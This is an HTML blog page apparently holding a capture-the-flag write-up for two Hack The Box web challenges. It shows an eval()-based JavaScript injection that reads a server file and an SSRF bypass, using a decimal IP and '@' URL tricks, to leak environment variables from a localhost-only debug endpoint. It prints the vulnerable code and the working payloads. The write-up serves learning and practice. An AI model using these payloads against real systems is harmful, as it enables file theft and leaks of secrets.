@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  
+  
+  <title>  HTB Web Challenge |   Ikonw </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png" />
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post slideDownMin">
+  
+	
+<div class="header">
+		<p class="title">	
+			HTB Web Challenge
+		</p>
+		<div class="info">	
+			<time>
+				Jan 01, 1998
+			</time>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="words">6456
+				</span>
+			
+		</div>
+</div> 
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+
+	  <div class="typo post-content ">
+
+		
+
+			
+					<h1 id="Jscalc-Easy"><a href="#Jscalc-Easy" class="headerlink" title="Jscalc - Easy"></a>Jscalc - Easy</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑</p>
+</blockquote>
+<p>Poking through the website found it uses <code>eval()</code>, in this case, it is vulnerable directly execute javascript codes</p>
+<p><img src="/images/HTB-Web-Challenge/image-20231211110203037.png"></p>
+<p>Take a look at routes, the <code>/api/calculate</code> accept variable called ‘<code>formula</code>‘ and passed it to the <code>calculatorHelp</code> calculator for processing</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path       = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router     = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Calculator</span> = <span class="built_in">require</span>(<span class="string">&#x27;../helpers/calculatorHelper&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; (&#123; <span class="attr">message</span>: data &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;views/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/calculate&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; formula &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (formula) &#123;</span><br><span class="line">		result = <span class="title class_">Calculator</span>.<span class="title function_">calculate</span>(formula);</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(result));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ocd</span></span><br></pre></td></tr></table></figure>
+
+<p>and it directly proceed with <code>eval</code> without sanitized the input</p>
+<figure class="highlight plaintext"><figcaption><span>js</span></figcaption><table><tr><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">    calculate(formula) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return eval(`(function() &#123; return $&#123; formula &#125; ;&#125;())`);</span><br><span class="line"></span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            if (e instanceof SyntaxError) &#123;</span><br><span class="line">                return &#x27;Something went wrong!&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://nodejs.org/en/learn/manipulating-files/reading-files-with-nodejs">Reading files with Node.js</a></p>
+<p><code>readFileSync</code> can be used to read files.</p>
+<p>craft payload in one line would be </p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;../flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Web-Challenge/image-20231211110904318.png"></p>
+<p>However it seems to return an object.</p>
+<p>Modify the parameter for readFileSync to <code>utf8</code></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;../flag.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Web-Challenge/image-20231211111035521.png"></p>
+<h1 id="ProxyAsService-Easy"><a href="#ProxyAsService-Easy" class="headerlink" title="ProxyAsService  - Easy"></a>ProxyAsService  - Easy</h1><p><strong>app.py</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.register_blueprint(proxy_api, url_prefix=<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">app.register_blueprint(debug, url_prefix=<span class="string">&#x27;/debug&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>2 route blueprint <code>proxy_api</code> and <code>debug</code></p>
+<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">ip</span>:<span class="keyword">port</span>/(proxy_api)</span><br><span class="line">ip:<span class="keyword">port</span>/debug(debug)</span><br></pre></td></tr></table></figure>
+
+<p><strong>route.py</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> application.util <span class="keyword">import</span> is_from_localhost, proxy_req</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">SITE_NAME = <span class="string">&#x27;reddit.com&#x27;</span></span><br><span class="line"></span><br><span class="line">proxy_api = Blueprint(<span class="string">&#x27;proxy_api&#x27;</span>, __name__)</span><br><span class="line">debug     = Blueprint(<span class="string">&#x27;debug&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">&#x27;/r/cats/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/r/catpictures&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/r/catvideos/&#x27;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;.proxy&#x27;</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f&#x27;http://<span class="subst">&#123;SITE_NAME&#125;</span><span class="subst">&#123;url&#125;</span>&#x27;</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br><span class="line"></span><br><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">&#x27;/environment&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Environment variables&#x27;</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">&#x27;Request headers&#x27;</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></table></figure>
+
+<p>Break down into 2 parts.</p>
+<p>in the default index route, if the <code>url</code> parameter is not provided in the request, it will be randomly assign a path to <code>reddits</code>.</p>
+<p>If the <code>url</code> is set in parameter, it will access the url through the <code>proxy_req</code> function</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@proxy_api.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        cat_meme_subreddits = [</span><br><span class="line">            <span class="string">&#x27;/r/cats/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/r/catpictures&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/r/catvideos/&#x27;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;.proxy&#x27;</span>, url=random_subreddit))</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">f&#x27;http://<span class="subst">&#123;SITE_NAME&#125;</span><span class="subst">&#123;url&#125;</span>&#x27;</span></span><br><span class="line">    response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></table></figure>
+
+<p><strong>utils.py</strong></p>
+<p>In this <code>utils.py</code> states the restriction for <code>proxy_req</code> functions stated previously, it will check if the <code>url</code> parameter contains the restricted keywords in the <code>RESTIRCTED_URLS</code> list. It will then act as a proxy send a request and forward the response back to user.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">RESTRICTED_URLS = [<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;127.&#x27;</span>, <span class="string">&#x27;192.168.&#x27;</span>, <span class="string">&#x27;10.&#x27;</span>, <span class="string">&#x27;172.&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> restricted_url <span class="keyword">in</span> RESTRICTED_URLS:</span><br><span class="line">        <span class="keyword">if</span> restricted_url <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_req</span>(<span class="params">url</span>):    </span><br><span class="line">    method = request.method</span><br><span class="line">    headers =  &#123;</span><br><span class="line">        key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> request.headers <span class="keyword">if</span> key.lower() <span class="keyword">in</span> [<span class="string">&#x27;x-csrf-token&#x27;</span>, <span class="string">&#x27;cookie&#x27;</span>, <span class="string">&#x27;referer&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    data = request.get_data()</span><br><span class="line"></span><br><span class="line">    response = requests.request(</span><br><span class="line">        method,</span><br><span class="line">        url,</span><br><span class="line">        headers=headers,</span><br><span class="line">        data=data,</span><br><span class="line">        verify=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_safe_url(url) <span class="keyword">or</span> <span class="keyword">not</span> is_safe_url(response.url):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> response, headers</span><br></pre></td></tr></table></figure>
+
+<p>From here, it clearly seems a <code>SSRF</code> challenge. But where is the flag?</p>
+<p>Checking through the docker files, the flag is hiding in the environment variable. Which we can obtain through the second part of the debug endpoints</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@debug.route(<span class="params"><span class="string">&#x27;/environment&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@is_from_localhost</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_environment</span>():</span><br><span class="line">    environment_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Environment variables&#x27;</span>: <span class="built_in">dict</span>(os.environ),</span><br><span class="line">        <span class="string">&#x27;Request headers&#x27;</span>: <span class="built_in">dict</span>(request.headers)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(environment_info)</span><br></pre></td></tr></table></figure>
+
+<p>It has to check if the request if is from localhost</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_from_localhost</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> request.remote_addr != <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> check_ip</span><br></pre></td></tr></table></figure>
+
+<p>Now the task seems clearer, we have to craft a SSRF attacks, targeted to the <code>/debug/environment</code> and leak the environment settings that contains the flag.</p>
+<p>Firstly, we have to bypass the restriction of <code>RESTRICTED_LIST</code>, it can be easily bypass by using decimal to represent IP address. <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost">Hacktrick</a> also provided other methods that represent <code>localhost</code></p>
+<p>Secondly, we cannot directly input the url point to endpoint as it will embedded a <code>reddit</code> infront of our provided user input.</p>
+<p>Therefore we can use @ to bypass that.</p>
+<p>Therefore the full payload will be </p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></table></figure>
+
+<p>The server side will interpreted as</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>//&lt;ip&gt;<span class="symbol">:&lt;port&gt;</span>?url=reddit<span class="variable">@2130706433</span><span class="symbol">:&lt;port&gt;/debug/environment</span></span><br></pre></td></tr></table></figure>
+
+<p>However, one interesting thing is when I setup docker in my localhost.</p>
+<p><img src="/images/HTB-Web-Challenge/image-20231211142253717.png"></p>
+<p>I am able to get the flag through the payload indicate the port to be 1337 (Which docker itself exposed to 1337)</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.17.0.1:1337</span>/?url=@<span class="number">2130706433</span>:<span class="number">1337</span>/debug/environment</span><br></pre></td></tr></table></figure>
+
+<p>but to the real target, I have difficulties using the same port 32436.</p>
+<p><img src="/images/HTB-Web-Challenge/image-20231211142411053.png"></p>
+<p>Suspect it is a mapping of ports when expose to public IPs.</p>
+<p>Therefore have to change the payload to port 1337</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/159.65.24.125:32436/</span><span class="string">?u</span>rl=<span class="variable">@0</span>.<span class="number">0.0</span>.<span class="number">0</span><span class="symbol">:</span><span class="number">1337</span>/debug/environment</span><br></pre></td></tr></table></figure>  	
+					
+	  </div>     
+	  
+
+	<div class="bottom">
+  <div class="other">
+    <div class="meta">
+      
+
+      
+    </div>
+
+    <div class="operate">
+      
+      <span class="text">Share</span>
+      <ul class="share">
+	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		item"
+		></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		item"
+		></li>		
+   	   
+</ul>	
+
+<script id="-mob-share" 
+src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      
+    </div>
+  </div>
+
+
+  
+  <nav class="nav">
+    <div class="link">
+      
+    </div>
+    <div class="link">
+      
+      <a href="/2020/01/10/HTB-bastion/" class="link-wrap">
+        <strong class="caption">newer</strong>
+        
+        <span class="title">
+          HTB Bastion Writeup
+        </span>
+      </a>
+      
+    </div>
+  </nav>
+  
+</div> 
+	
+<div class="comment">
+
+    
+
+    <div id="comment">
+    </div>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+
+    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+
+    <script>
+        new Valine({
+            el: '#comment',
+            notify: false,
+            verify: false,
+            app_id: 'cFM0eCo0CQ9xmBXmHi1eltol-gzGzoHsz',
+            app_key: 'oh9tizsnvV2vNvWgqEvoNtQO',
+            path: window.location.pathname,
+            avatar: 'mm',
+            guest_info: ['nick', 'mail']
+        });
+    </script>
+    
+</div>	
+</article>
+
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" 
+        placeholder="Typing Something here." 
+        id="search-input" 
+        class="input" />
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			&copy;
+			
+			2019 -
+			
+			2023
+			Ikonw
+
+			<br/>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+  </body>        
+</html>
